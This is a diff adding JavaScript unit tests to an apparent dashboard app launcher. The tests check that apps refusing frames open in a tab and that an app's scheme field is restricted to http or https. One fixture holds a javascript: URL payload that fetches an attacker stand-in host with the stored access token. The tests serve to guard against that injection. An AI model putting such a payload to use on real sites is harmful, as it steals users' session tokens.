@@ -72,3 +72,53 @@ describe('opening an app that has no web interface', () => {
 		expect(calls.launcher[0][1].url).toBe('https://apps.example.org/web')
 	})
 })
+
+describe('opening an app the box found refusing a frame', () => {
+	it('goes to a tab, inside the click', async () => {
+		const { rememberFrameRefused, forgetFrameChecks } = await import('./frameCheck')
+		rememberFrameRefused('https://192.168.1.50:8443/nifi/')
+		const { ctx, calls } = harness()
+		const open = vi.spyOn(window, 'open').mockImplementation(() => null)
+
+		ctx.openAppToNewWindow({ name: 'nifi', status: 'running', hostname: '192.168.1.50', scheme: 'https', port: '8443', index: '/nifi/' })
+
+		expect(open).toHaveBeenCalledWith('https://192.168.1.50:8443/nifi/', '_blank')
+		expect(calls.launcher.map(([event]) => event)).not.toContain('openAppIframe')
+		open.mockRestore()
+		forgetFrameChecks()
+	})
+})
+
+// The scheme is a field of the app's compose file, and the file may come from any
+// store. Put in front of the address as it is, `javascript:...//` made an address
+// the browser runs as a script, in the frame of the dashboard or in a tab it opens.
+describe('opening an app whose scheme is not http or https', () => {
+	// eslint-disable-next-line no-template-curly-in-string -- a script, as a store could write it
+	const script = 'javascript:fetch(`//evil.example/${localStorage.access_token}`)//'
+
+	it('opens its address over http, in the frame', () => {
+		const { ctx, calls } = harness()
+
+		ctx.openAppToNewWindow({ name: 'trap', status: 'running', hostname: '192.168.1.50', scheme: script, port: '8080', index: '/' })
+
+		expect(calls.launcher[0][1].url).toBe('http://192.168.1.50:8080/')
+	})
+
+	it('opens its address over http, in a tab', () => {
+		const { ctx } = harness({ $store: { state: { appLaunchInIframe: false, appLaunchExceptions: [] } } })
+		const open = vi.spyOn(window, 'open').mockImplementation(() => null)
+
+		ctx.openAppToNewWindow({ name: 'trap', status: 'running', hostname: '192.168.1.50', scheme: script, port: '8080', index: '/' })
+
+		expect(open).toHaveBeenCalledWith('http://192.168.1.50:8080/', '_blank')
+		open.mockRestore()
+	})
+
+	it('keeps https, however it is written', () => {
+		const { ctx, calls } = harness()
+
+		ctx.openAppToNewWindow({ name: 'proxied', status: 'running', hostname: 'apps.example.org', scheme: 'HTTPS', port: '', index: '/web' })
+
+		expect(calls.launcher[0][1].url).toBe('https://apps.example.org/web')
+	})
+})
